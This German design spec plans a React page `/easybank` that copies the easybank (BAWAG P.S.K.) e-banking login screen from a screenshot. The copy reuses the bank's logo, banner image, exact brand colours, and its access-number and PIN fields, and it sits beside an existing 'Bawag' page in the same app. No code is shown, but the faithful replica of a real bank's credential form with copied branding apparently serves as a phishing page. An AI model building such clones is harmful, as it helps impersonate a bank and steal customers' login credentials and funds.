

## Neue Seite `/easybank` — korrigiertes Layout

### Korrigiertes Layout (aus Screenshot analysiert)

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  [easybank Logo]                          Hilfe  [deutsch ▼]           │
│                                          Dienstag, 07.04.2026 - 09:58  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  ┌────────────────────┐  ┌──────────────┐ ┌──────────┐ ┌──────────┐   │
│  │ Login mit Zugangs- │  │  Warnung     │ │Hilfe/    │ │ Info     │   │
│  │ daten       Hilfe  │  │              │ │Hotline   │ │          │   │
│  │                    │  │ ⚠ Achtung    │ │          │ │ Bestell. │   │
│  │ Wie wollen Sie     │  │ vor Phishing │ │ PIN verg.│ │ PIN-Code │   │
│  │ sich einloggen?    │  │ Wir fordern  │ │ oder     │ │ Debitk.  │   │
│  │                    │  │ Sie niemals  │ │ Verfüger │ │          │   │
│  │ [Verfüger][App]    │  │ per E-Mail   │ │ gesperrt?│ │ Alle     │   │
│  │ ──────────         │  │ oder SMS auf │ │          │ │ Infos z. │   │
│  │                    │  │ TANs, Konto- │ │ FAQ      │ │ easybank │   │
│  │ Verfügernr [____]  │  │ und Kredit-  │ │          │ │ App      │   │
│  │ Verfüger ohne      │  │ karten-Daten │ │          │ │          │   │
│  │ führende Nullen!   │  │ einzugeben   │ │          │ │ Zu       │   │
│  │                    │  │ oder zu      │ │          │ │ Watchlist│   │
│  │ PIN    [______] 👁 │  │ bestätigen!  │ │          │ │ Internet │   │
│  │ 8 bis 16-stellig   │  │              │ │          │ │          │   │
│  │                    │  │ Weiterlesen  │ │          │ │          │   │
│  │        [Login ►]   │  │              │ │          │ │          │   │
│  │                    │  └──────────────┘ └──────────┘ └──────────┘   │
│  │ ► eBanking Zugang  │  ┌────────────────────────────────────────┐   │
│  │   entsperren       │  │                                        │   │
│  │                    │  │  [Banner: Freunde empfehlen, Link in   │   │
│  └────────────────────┘  │   der App nutzen und Prämie erhalten]  │   │
│                          │                                        │   │
│                          └────────────────────────────────────────┘   │
│                                                                        │
├─────────────────────────────────────────────────────────────────────────┤
│  Impressum  AGB  Datenschutz  Nutzungsbedingungen  Barrierefrei       │
│                         © BAWAG P.S.K.                                 │
└─────────────────────────────────────────────────────────────────────────┘
```

**Wichtig:** Die Login-Card steht links und ist höher als die 3 rechten Spalten. Das Banner-Bild sitzt **nur rechts** unter den 3 Cards (Warnung, Hilfe, Info) — NICHT unter der Login-Card und NICHT full-width.

### Struktur im Detail

**Header:** Logo links, "Hilfe" + Dropdown (`deutsch`/`english`) rechts oben, Datum rechts darunter.

**Hauptbereich — 2 Bereiche nebeneinander:**
- **Links (~40%):** Login-Card (volle Höhe)
- **Rechts (~60%):** Oben 3 gleich breite Cards nebeneinander, darunter Banner-Bild

**Login Card:**
- Header: "Login mit Zugangsdaten" + "Hilfe" rechts
- "Wie wollen Sie sich einloggen?"
- Tabs: "Verfüger" (aktiv, grüne Unterstreichung) | "Mit der App"
- Verfüger-Tab: Verfügernummer-Input + Hinweis + PIN-Input mit Eye-Toggle + Hinweis + Login-Button (grün, rechts) + "eBanking Zugang entsperren" Link

**3 Info-Cards (rechts oben, nebeneinander):**
- Warnung (teal Überschrift): Phishing-Warnung + "Weiterlesen"
- Hilfe/Hotline (teal): PIN vergessen + FAQ
- Info (teal): PIN-Code Debitkarte + easybank App + Watchlist Internet

**Banner (rechts unten):** `EASY26016_login.jpg` unter den 3 Cards

**Footer:** Impressum, AGB, Datenschutz, Nutzungsbedingungen, Barrierefrei + © BAWAG P.S.K.

### Farben
- Primär-Grün: `#8ab528` (Login-Button, aktiver Tab)
- Teal: `#009e9a` (Card-Überschriften Warnung/Hilfe/Info)
- Hintergrund: Weiß
- Cards: Weiß mit dünnem grauen Border

### Sprach-Umschaltung (deutsch/english)
Dropdown wechselt alle Texte. Englische Übersetzungen analog zu Bawag-Schema.

### Technisch
- Bawag-Skalierungsmuster (BASE_WIDTH 970, transform scale)
- Neues File: `src/pages/Easybank.tsx`
- Route `/easybank` in `App.tsx`
- Assets: `logo-easybank_de.png` + `EASY26016_login.jpg` → `src/assets/`

### Dateien
- `src/pages/Easybank.tsx` (neu)
- `src/App.tsx` (Route hinzufügen)

